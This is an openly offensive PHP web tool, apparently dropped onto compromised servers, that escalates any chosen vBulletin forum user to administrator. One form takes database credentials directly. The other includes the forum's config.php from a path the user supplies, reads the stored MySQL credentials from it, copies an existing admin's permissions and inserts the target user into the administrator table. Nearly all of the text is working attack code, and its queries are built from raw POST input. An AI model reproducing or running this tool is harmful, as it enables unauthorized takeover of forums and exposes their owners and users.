<?
###################################################
#                                                         by 0.s41.4h.m4.d!                                                 #
#                                                      Ema!l : 0.w[at]w.cn                                                   #
###################################################
?>
<html><style>
BODY { scrollbar-face-color: #aadd00; scrollbar-shadow-color: #101010; 
scrollbar-highlight-color: #101010; scrollbar-3dlight-color: #101010; 
scrollbar-darkshadow-color: #101010; scrollbar-track-color: #101010; 
scrollbar-arrow-color: #101010; font-family: Verdana;}
input, select, textarea {background-color: #aadd00;
}
</style>
<head>
<meta http-equiv=Content-Language content=ar-sa>
  <title>[Change User 2 Admin] for all vB Forum </title>
</head>
       <body bgcolor=#101010 text=#A2A2A2>
       <div align=center>
	   <p><font color=#DDDDDD>ÈÓã Çááå ÇáÑÍãä ÇáÑÍíã</font></p>
       <span style=font-size: 12.0pt; font-family: Times New Roman>&nbsp;</span><font size=5 color=#AADD00><span style=font-family: Times New Roman>Ch4ng3
		</span> U$3r  2  4dm!n <br>
		F0r 411 vBu1137!n F0rum$</font><p> </p>
		
		<p>
			<div align=center>
			<table border=1 width=60%  cellspacing=0 cellpadding=0 bgcolor=#535353 bordercolor=#6E6E6E height=20%>
		<tr>
			<td height=12><p align=center><font color=#aadd00 size=5>ŞÈá Ãä ÊÈÏÃ ÊĞßÑ Şæá Çááå ÊÚÇáì</font></p></td>
		</tr>
		<tr>
			<td bordercolor=#6E6E6E bgcolor=#000000 align=center>
		<table border=0 width=100%  cellspacing=0 cellpadding=0>
			<tr>
				<td><p align=center><font color=blue size=4 face=tahoma>{ÅöäøóãóÇ 
ÇáÓøóÈöíáõ Úóáóì ÇáøóĞöíäó íóÙúáöãõæäó ÇáäøóÇÓó æóíóÈúÛõæäó İöí ÇáúÃóÑúÖö 
ÈöÛóíúÑö ÇáúÍóŞøö ÃõæúáóÆößó áóåõã ÚóĞóÇÈñ Ãóáöíãñ}</font></p></td>
			</tr>
			<tr>
				<td><font size=2 color=#FFFFCC>(ÓæÑÉ ÇáÔæÑì 42)</font></td>
			</tr>
		</table>
			</td>
		</tr>
		<tr>
			<td height=12></td>
		</tr>
		</table>
       </div>
		</p>
		<P>
		

		<table border=1 width=60% id=table1 cellspacing=0 cellpadding=0 bgcolor=#535353 bordercolor=#6E6E6E height=40%>
		<tr>
			<td height=12><font face=Wingdings 2>4</font> By MySql </td>
		</tr>
		<tr>
			<td bordercolor=#6E6E6E bgcolor=#000000 align=center>
<?
if(empty($_POST['send'])){
echo "<p><form method=POST>
	<p>
<input type=text name=localhost size=15 value=localhost>
	<input type=text name=username size=15 value='USER NAME'> 
	<input type=text name=password size=15 value='PASS'>
	<input type=text name=database size=15 value='DATABASE'><p>
	<input type=text name=adminid1 size=15 value='ADMIN ID'>
	<input type=text name=userid1 size=15 value='USER ID'> 
	</p>
<p><font color=#FFFFFF size=4>refix</font>:<input type=text name=refix size=6></p>
<input type=submit value=Ch4ng3 name=send></p></form></p></td>
		</tr>
		<tr>
			<td height=12></td>
		</tr>
		</table>";
}else{
$localhost = $_POST['localhost'];
$database  = $_POST['database'];
$username  = $_POST['username'];
$password  = $_POST['password'];
$userid1 = $_POST['userid1'];
$adminid1 = $_POST['adminid1'];
$$refix = $_POST['refix'];

         @mysql_connect($localhost,$username,$password) or die(print "<p><font color=#800000>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
ÎØÃ</font></p><p><font color=#800000>ÊÃßÏ ãä ÇÏÎÇá ÈíÇäÇÊ ÇáŞÇÚÏÉ ÈÔßá ÕÍíÍ</font></p>");
         @mysql_select_db($database) or die(print"<p><font color=#FF0000>ÇÓã ŞÇÚÏÉ ÇáÈíÇäÇÊ ááãäÊÏì ÛíÑ ÕÍíÍ</font></p>");

//****************************************************
$administrator = $refix."administrator";
$user = $refix."user";
$usergroup = $refix."usergroup";
//****************************************************
		 
		 //--------------------------------------------------------------------------------------
		 $ssw221= mysql_query("SELECT * FROM $user where userid=$adminid1");
		 while($res221= mysql_fetch_array($ssw221)){
 $z223= $res221['usergroupid'];
 }
//****************************************************
// 
//****************************************************	 
		 $ssw= mysql_query("SELECT * FROM $administrator where userid= $adminid1");
while($res= mysql_fetch_array($ssw)){
 $x= $res['adminpermissions'];
}
$d12=@mysql_query("INSERT INTO $administrator(userid,adminpermissions) VALUES ('$userid1','$x'); ") or die(mysql_error());
$d1=@mysql_query("UPDATE $user SET usergroupid = $z223 WHERE userid = $userid1") or die(mysql_error());
//****************************************************
if($d1 and $d12){
echo " <p><font color=#FFFF00 size=4>Êã ÈÍãÏÇááå ÊÛííÑ ÇáÕáÇÍíÇÊ ãä íæÒÑ Çáì ÇÏãä</font></p>";
}else{
echo " <p><font color=#FF0000 size=4>ÎØÃ</font></p>";
}


}

?>
</td>
		</tr>
		<tr>
			<td height=12></td>
		</tr>
		</table>
       </div>
	   <div align=center>
<p></p>
		<table border=1 width=60% id=table1 cellspacing=0 cellpadding=0 bgcolor=#535353 bordercolor=#6E6E6E height=40%>
		<tr>
			<td height=12><font face=Wingdings 2>4</font> By Config </td>
		</tr>
		<tr>
			<td bordercolor=#6E6E6E bgcolor=#000000 align=center>
<?

if(empty($_POST['send2'])){
echo "<form method=POST>
<p>
<input type=text name=config1 size=60 value='/home/USER/public_html/FORUM/includes/config.php'><p>
	<input type=text name=userid1 size=27 value='USER ID'>
	<input type=text name=adminid1 size=27 value='ADMIN ID'><p>
<input type=submit value=Ch4ng3 name=send2></form>
";
}else{
$config1 = $_POST['config1'];
include("$config1");
$userid1 = $_POST['userid1'];
$adminid1 = $_POST['adminid1'];
//****************************************************
$refix = $config['Database']['tableprefix'];
$administrator = $refix."administrator";
$user = $refix."user";
$usergroup = $refix."usergroup";
//****************************************************
         @mysql_connect($config['MasterServer']['servername'],$config['MasterServer']['username'],$config['MasterServer']['password']) or die(print "<p><font color=#FF0000>íÈæä Çä ãÓÇÑ ãáİ ÇáßæäŞ ÛíÑ ÕÍíÍ </font></p>");
         @mysql_select_db($config['Database']['dbname']) or die(mysql_error());
		 
		 //--------------------------------------------------------------------------------------
		 $ssw221= mysql_query("SELECT * FROM $user where userid=$adminid1");
		 while($res221= mysql_fetch_array($ssw221)){
 $z223= $res221['usergroupid'];
 }
 
//****************************************************
// 
//****************************************************	 
		 $ssw= mysql_query("SELECT * FROM $administrator where userid= $adminid1");
while($res= mysql_fetch_array($ssw)){
 $x= $res['adminpermissions'];
}
$k12=@mysql_query("INSERT INTO $administrator(userid,adminpermissions) VALUES (".$userid1.",".$x."); ") or die(mysql_error());
$k1=mysql_query("UPDATE $user SET usergroupid = $z223 WHERE userid = $userid1") or die(mysql_error());

//****************************************************
if($k1 and $k12){
echo " <p><font color=#FFFF00 size=4>Êã ÈÍãÏÇááå ÊÛííÑ ÇáÕáÇÍíÇÊ ãä íæÒÑ Çáì ÇÏãä</font></p>";
}else{
echo " <p><font color=#FF0000 size=4>ÎØÃ</font></p>";
}

}

?>


</td>
		</tr>
		<tr>
			<td height=12></td>
		</tr>
		</table>
       </div>
	   		<p align=center><font size=4 color=#990033>[by ahwak2000]</font></p>
		<p align=center><a href=mailto:0.w@w.cn>
		<font size=4 color=#990033>0.w[at]w.cn</font></a></p>